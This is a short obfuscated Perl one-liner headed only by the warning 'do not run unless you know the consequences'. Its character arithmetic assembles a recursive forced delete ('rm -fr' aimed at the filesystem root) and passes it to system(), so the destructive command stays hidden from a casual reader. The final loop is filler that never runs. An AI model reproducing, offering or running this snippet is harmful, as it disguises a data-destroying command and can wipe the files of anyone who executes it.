# do not run unless you know the consequences
$I='*#/&';$II='%#';@2=qq!\ !;foreach(split//,
$I){push@1,(chr(ord("$_")+67));}foreach(split
//,$II){push@0,chr((ord("$_")+10));}system(("
$1[2]$1[0]$2[0]$0[1]$1[1]$1[2]$2[0]$0[0]$0[1]
"));until(defined($$)){(chop@ARGV[1]);chomp;}
